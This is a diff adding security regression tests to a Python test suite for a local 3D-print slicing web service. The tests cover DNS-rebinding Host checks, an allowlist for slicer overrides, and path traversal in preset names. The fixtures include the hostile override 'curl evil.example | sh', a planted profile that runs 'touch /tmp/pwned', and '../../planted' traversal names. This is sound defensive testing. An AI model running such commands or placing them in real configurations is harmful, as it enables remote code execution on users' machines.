@@ -891,10 +891,134 @@ def test_bambu():
     bambu.clear()
 
 
+# ---------------------------------------------------------------- audit 2026-11-01
+
+def test_host_rebinding():
+    """BS-01. A rebound page sends a Host naming the attacker's domain and an
+    Origin that matches it, so Origin == Host alone lets it in. Each refusal is
+    paired with a legitimate request through the same route that is not refused,
+    so a server that 403s everything cannot pass."""
+    with Live() as live:
+        port = live.port
+        evil = {"Host": f"evil.example:{port}", "Origin": f"http://evil.example:{port}"}
+        status, body = live.request("POST", "/api/print", {}, headers=evil)
+        check("rebinding: POST with Host evil.example and a matching Origin is refused",
+              status == 403, (status, body))
+        status, _ = live.request("DELETE", "/api/library/whatever", headers=evil)
+        check("rebinding: DELETE with a rebound Host is refused", status == 403, status)
+        status, _ = live.request("GET", "/api/library", headers={"Host": f"evil.example:{port}"})
+        check("rebinding: GET of the API with a rebound Host is refused", status == 403, status)
+        status, _ = live.request("POST", "/api/print", {},
+                                 headers={"Host": "127.0.0.1.nip.io",
+                                          "Origin": "http://127.0.0.1.nip.io"})
+        check("rebinding: an IP-shaped DNS name is still a DNS name", status == 403, status)
+
+        for host in (f"127.0.0.1:{port}", f"localhost:{port}", f"[::1]:{port}",
+                     "bluesheet.local", "192.168.0.40:8132", "claudespace.local:8132"):
+            status, body = live.request("POST", "/api/print", {},
+                                        headers={"Host": host, "Origin": f"http://{host}"})
+            check(f"legit Host {host} with its own Origin reaches the route",
+                  status == 400, (status, body))
+        status, _ = live.request("POST", "/api/print", {})
+        check("no Origin and the default Host still reaches the route (curl, tests)",
+              status == 400, status)
+        status, _ = live.request("GET", "/api/health", headers={"Host": f"localhost:{port}"})
+        check("GET /api/health on localhost still answers", status == 200, status)
+        status, _ = live.request("GET", "/index.html", headers={"Host": f"evil.example:{port}"})
+        check("static pages are not gated on Host (nothing to steal)", status == 200, status)
+
+    # The extension: a custom name is refused until it is configured.
+    allowed = entry.host_allowed
+    check("an unlisted custom name is refused", not allowed("studio.lan:8132"))
+    old = os.environ.get("BLUESHEET_ALLOWED_HOSTS")
+    os.environ["BLUESHEET_ALLOWED_HOSTS"] = " Studio.lan , other.example "
+    try:
+        names = entry._host_names()
+    finally:
+        if old is None:
+            os.environ.pop("BLUESHEET_ALLOWED_HOSTS", None)
+        else:
+            os.environ["BLUESHEET_ALLOWED_HOSTS"] = old
+    check("BLUESHEET_ALLOWED_HOSTS admits a configured name",
+          allowed("studio.lan:8132", names) and allowed("other.example", names))
+    check("and still refuses the rest", not allowed("evil.example", names))
+    for bad in ("[::1", "[::1]x", "localhost:80x", ":8132"):
+        check(f"malformed Host {bad!r} refused", not allowed(bad))
+
+
+def _fake_profiles(root):
+    """Just enough of an Orca vendor tree for normalise() to get past the preset
+    lookups, so the override checks run on a machine without Orca."""
+    def put(rel, data):
+        path = os.path.join(root, rel)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w") as f:
+            json.dump(data, f)
+    put("BBL/process/0.20mm Standard @BBL A1M.json",
+        {"name": "0.20mm Standard @BBL A1M", "layer_height": "0.2",
+         "sparse_infill_density": "15%", "initial_layer_print_height": "0.2"})
+    put("BBL/filament/Bambu PLA Basic @BBL A1M.json", {"name": "Bambu PLA Basic @BBL A1M"})
+    put(f"BBL/machine/{slicer.MACHINE}.json", {"name": slicer.MACHINE})
+    put("planted.json", {"name": "planted", "post_process": ["touch /tmp/pwned"]})
+
+
+def test_slice_override_allowlist():
+    """BS-02 (and BS-04). An override reaches the process overlay verbatim, so it
+    must be a setting someone tunes a print with, never one that runs a command,
+    sends raw G-code or names a file."""
+    root = tempfile.mkdtemp(prefix="bluesheet-test-profiles-")
+    real = slicer.PROFILES
+    slicer.PROFILES = root
+    slicer._preset_cache.clear()
+    try:
+        _fake_profiles(root)
+        base = slicer.normalise({})
+        check("fake profiles normalise (the checks below are not vacuous)",
+              base["process"] == "0.20mm Standard @BBL A1M", base.get("process"))
+
+        def refused(label, raw, needle):
+            try:
+                slicer.normalise(raw)
+            except slicer.SliceError as e:
+                return check(label, needle in str(e), str(e))
+            return check(label, False, "accepted")
+
+        refused("override post_process (shell commands) refused",
+                {"overrides": {"post_process": ["curl evil.example | sh"]}}, "post_process")
+        for key in ("machine_start_gcode", "machine_end_gcode", "layer_change_gcode",
+                    "before_layer_change_gcode", "change_filament_gcode",
+                    "filename_format", "timelapse_type", "nozzle_temperature"):
+            refused(f"override {key} refused", {"overrides": {key: "M104 S300"}}, key)
+
+        ok = slicer.normalise({"overrides": {"outer_wall_speed": 150, "wall_loops": "3",
+                                             "sparse_infill_pattern": "gyroid",
+                                             "enable_arc_fitting": True}})
+        check("legit overrides accepted and stringified",
+              ok["overrides"] == {"outer_wall_speed": "150", "wall_loops": "3",
+                                  "sparse_infill_pattern": "gyroid",
+                                  "enable_arc_fitting": "1"}, ok["overrides"])
+        smoke = slicer.normalise({"overrides": {"spiral_mode": "1"}})
+        check("slice_smoke's spiral_mode override still accepted",
+              smoke["overrides"] == {"spiral_mode": "1"}, smoke["overrides"])
+        over = slicer._process_overrides(ok, slicer.resolve_preset("process", ok["process"]))
+        check("an accepted override reaches the overlay", over.get("outer_wall_speed") == "150",
+              over.get("outer_wall_speed"))
+
+        refused("process preset name with ../ refused (BS-04)",
+                {"profile": "../../planted"}, "unknown profile")
+        refused("filament preset name with ../ refused (BS-04)",
+                {"filament": "../../planted"}, "unknown filament")
+    finally:
+        slicer.PROFILES = real
+        slicer._preset_cache.clear()
+        shutil.rmtree(root, ignore_errors=True)
+
+
 def main():
     for test in (test_util, test_stl, test_static_allowlist, test_slicer_settings,
                  test_placement, test_gcode, test_verify, test_library, test_tokens, test_http,
-                 test_elevation_and_fonts, test_bambu):
+                 test_elevation_and_fonts, test_bambu, test_host_rebinding,
+                 test_slice_override_allowlist):
         try:
             test()
         except Exception:
